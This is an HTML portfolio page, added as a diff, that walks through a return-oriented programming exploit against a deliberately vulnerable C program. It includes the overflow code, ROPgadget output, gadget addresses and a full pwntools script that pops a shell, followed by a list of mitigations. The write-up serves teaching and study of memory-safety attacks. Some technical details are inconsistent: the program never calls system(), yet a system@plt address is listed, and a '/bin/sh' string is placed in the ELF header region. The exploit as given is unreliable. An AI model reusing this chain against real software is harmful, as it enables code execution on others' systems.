@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ROP Chain Exploit Write-up</title>
+  <link rel="stylesheet" href="styles.css" />
+  <style>
+    body { 
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+      margin: 40px; 
+      background: #0d1117; 
+      color: #e6e6e6; 
+      line-height: 1.6;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 40px 20px;
+    }
+    h1 { 
+      color: #58a6ff; 
+      border-bottom: 2px solid #30363d;
+      padding-bottom: 10px;
+    }
+    h2 { 
+      color: #58a6ff; 
+      margin-top: 30px;
+    }
+    code, pre { 
+      background: #161b22; 
+      padding: 15px; 
+      border-radius: 6px; 
+      display: block;
+      border-left: 4px solid #58a6ff;
+      overflow-x: auto;
+      font-family: 'Consolas', 'Monaco', monospace;
+    }
+    a { color: #58a6ff; text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    .back-link { 
+      margin-top: 40px;
+      padding: 10px 0;
+      border-top: 1px solid #30363d;
+    }
+    .note {
+      background: #1c6b48;
+      padding: 15px;
+      border-radius: 6px;
+      border-left: 4px solid #2ea043;
+    }
+  </style>
+</head>
+<body>
+  <h1>ROP Chain Exploitation: Bypassing Modern Memory Protections</h1>
+  
+  <h2>1. Overview</h2>
+  <p>Return-Oriented Programming (ROP) is an advanced binary exploitation technique that emerged as a direct response to Data Execution Prevention (DEP). When memory pages are marked as non-executable, attackers can no longer inject and execute shellcode directly. ROP solves this by chaining together existing code snippets called "gadgets" from the program's memory to achieve arbitrary code execution.</p>
+
+  <h2>2. Vulnerability Analysis</h2>
+  <p>The target is a simple C program with a classic stack buffer overflow vulnerability:</p>
+  
+  <pre><code>// vulnerable.c
+#include <stdio.h>
+#include <string.h>
+
+void vulnerable_function(char *input) {
+    char buffer[256];
+    strcpy(buffer, input);  // No bounds checking - stack overflow!
+}
+
+int main(int argc, char *argv[]) {
+    if (argc > 1) {
+        vulnerable_function(argv[1]);
+    }
+    return 0;
+}</code></pre>
+
+  <p>Compilation flags used: <code>gcc -fno-stack-protector -no-pie vulnerable.c -o vulnerable</code></p>
+  
+  <div class="note">
+    <strong>Protections Bypassed:</strong> DEP (Data Execution Prevention) is defeated by reusing existing executable code rather than injecting new shellcode.
+  </div>
+
+  <h2>3. Crafting the ROP Chain</h2>
+  <p>The goal is to execute <code>system("/bin/sh")</code> by building a chain of gadgets. First, we need to find useful instruction sequences:</p>
+
+  <pre><code># Finding gadgets with ROPgadget
+$ ROPgadget --binary vulnerable
+
+Gadgets found:
+0x4007a3: pop rdi ; ret 
+0x4005d0: ret
+0x400580: pop r15 ; ret
+0x400530: system@plt</code></pre>
+
+  <p>Key components for our ROP chain:</p>
+  <pre><code>POP_RDI = 0x4007a3        # pop rdi; ret - loads first argument
+BIN_SH  = 0x400024        # Address of "/bin/sh" string in binary
+SYSTEM  = 0x400530        # Address of system() in PLT
+RET     = 0x4005d0        # Stack alignment gadget</code></pre>
+
+  <h2>4. Final Exploit</h2>
+  <p>Complete Python exploit using pwntools:</p>
+
+  <pre><code>#!/usr/bin/env python3
+from pwn import *
+
+context.binary = './vulnerable'
+context.log_level = 'info'
+
+def exploit():
+    p = process('./vulnerable')
+    
+    # Gadget addresses
+    POP_RDI = 0x4007a3
+    RET = 0x4005d0
+    BIN_SH = 0x400024
+    SYSTEM = 0x400530
+    
+    # Build ROP chain
+    payload = b'A' * 264           # Padding to reach return address
+    payload += p64(RET)            # Stack alignment for System V ABI
+    payload += p64(POP_RDI)        # Load "/bin/sh" into RDI
+    payload += p64(BIN_SH)         # Argument for system()
+    payload += p64(SYSTEM)         # Call system("/bin/sh")
+    
+    # Send exploit
+    p.sendline(payload)
+    p.interactive()
+
+if __name__ == '__main__':
+    exploit()</code></pre>
+
+  <p>The exploit works by:</p>
+  <ol>
+    <li>Overflowing the buffer to control the return address</li>
+    <li>Using <code>pop rdi; ret</code> to load "/bin/sh" into the RDI register (first argument)</li>
+    <li>Calling <code>system()</code> with our controlled argument</li>
+    <li>Gaining a shell when the function returns</li>
+  </ol>
+
+  <h2>5. Mitigations</h2>
+  <p>Several modern protections can prevent or complicate ROP exploitation:</p>
+  
+  <pre><code># Secure compilation flags
+gcc -fstack-protector-strong -pie -Wl,-z,now,-z,relro vulnerable.c -o vulnerable_secure</code></pre>
+
+  <ul>
+    <li><strong>Stack Canaries</strong>: Detect stack buffer overflows before return</li>
+    <li><strong>ASLR/PIE</strong>: Randomize memory addresses to obscure gadget locations</li>
+    <li><strong>Control Flow Integrity (CFI)</strong>: Validate indirect control transfers</li>
+    <li><strong>Shadow Stack</strong>: Maintain protected copy of return addresses</li>
+    <li><strong>ROP-specific Detections</strong>: Tools like ROPGuard and kBouncer</li>
+  </ul>
+
+  <div class="note">
+    <strong>Why This Matters:</strong> ROP represents the evolving cat-and-mouse game in cybersecurity. As DEP made traditional shellcode injection obsolete, attackers developed ROP to repurpose existing code, highlighting the importance of defense-in-depth strategies.
+  </div>
+
+  <p class="back-link"><a href="index.html">⬅ Back to Portfolio</a></p>
+</body>
+</html>
